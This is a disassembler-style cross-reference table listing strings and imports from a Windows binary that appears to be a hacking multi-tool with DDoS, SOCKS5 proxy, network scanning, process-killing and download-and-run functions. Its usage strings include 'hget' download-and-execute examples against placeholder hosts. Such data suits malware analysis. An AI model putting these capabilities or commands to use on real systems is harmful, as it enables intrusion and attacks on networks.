reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x401029	0x41509c	import	0x401000	KERNEL32.dll.GetModuleFileNameA
0x401034	0x415494	string	0x401000	%s -run
0x401078	0x41548c	string	0x401000	-usage
0x401091	0x415484	string	0x401000	-help
0x4010c3	0x415478	string	0x401000	-enum
0x4010dc	0x415470	string	0x401000	enum
0x4010f5	0x415464	string	0x401000	-enumhost
0x40110e	0x415458	string	0x401000	enumhost
0x401127	0x415450	string	0x401000	-hmb
0x401159	0x415444	string	0x401000	-hbs
0x4011a4	0x415434	string	0x401000	-socks5
0x4011bd	0x41542c	string	0x401000	socks5
0x4011ef	0x415420	string	0x401000	-ddos
0x401208	0x415418	string	0x401000	ddos
0x40123a	0x41540c	string	0x401000	-hscan
0x401253	0x415404	string	0x401000	hscan
0x401285	0x4153f8	string	0x401000	-hget
0x40129e	0x4153f0	string	0x401000	hget
0x4012b7	0x4153e8	string	0x401000	-pslist
0x4012cc	0x4153e0	string	0x401000	pslist
0x4012e1	0x4153d8	string	0x401000	-pskill
0x4012f6	0x4153d0	string	0x401000	pskill
0x401326	0x4153b4	string	0x401000	Usage of Pskill: %s PID\n
0x40134a	0x41537c	string	0x401000	hget ftp://user:pass@ftp.xxx.com/test.exe test.exe\n
0x40134f	0x415348	string	0x401000	hget http://www.xxx.com/test.exe test.exe run\n
0x401355	0x415308	string	0x401000	Usage of HGet: %s <HTTPFile|FTPFile> <LocalFile> [run]\n\n%s%s
0x401403	0x415210	import	0x401000	WS2_32.dll.WSACleanup
0x40144d	0x41520c	import	0x401430	WS2_32.dll.WSAStartup
0x4014d0	0x4155e4	string	0x4014d0	[Usage of Function:]\n
0x4014da	0x4155c0	string	0x4014d0	\t-hget Get HTTP/FTP File\n
0x4014e4	0x4155a0	string	0x4014d0	\t-socks5 Socks5 Proxy\n
0x4014ee	0x415574	string	0x4014d0	\t-hmb Domain MX Banner Finder\n
0x4014f8	0x41554c	string	0x4014d0	\t-hbs Port Banner Scanner\n
0x401502	0x415524	string	0x4014d0	\t-enumhost Enum Network Hosts\n
0x40150c	0x4154f8	string	0x4014d0	\t-hscan Ping/Name/SQL/IPC Scanner\n
0x401516	0x4154d8	string	0x4014d0	\t-pslist List Process\n
0x401520	0x4154b4	string	0x4014d0	\t-pskill Kill a Process\n
0x401578	0x4156a8	string	0x401530	Mozilla/4.0 (compatible)
0x40157f	0x4151ac	import	0x401530	WININET.dll.InternetOpenA
0x401593	0x4151a0	import	0x401530	WININET.dll.InternetOpenUrlA
0x4015a6	0x415690	string	0x401530	Bad url, or DNS error.\n
0x4015b5	0x4151a4	import	0x401530	WININET.dll.InternetCloseHandle
0x4015e7	0x4150ac	import	0x401530	KERNEL32.dll.CreateFileA
0x4015fc	0x4150a8	import	0x401530	KERNEL32.dll.GetTickCount
0x40161a	0x415674	string	0x401530	File download:(%s -> %s).\r\n
0x401674	0x4151a8	import	0x401530	WININET.dll.InternetReadFile
0x40168f	0x4150a4	import	0x401530	KERNEL32.dll.WriteFile
0x4016b1	0x4150a0	import	0x401530	KERNEL32.dll.CloseHandle
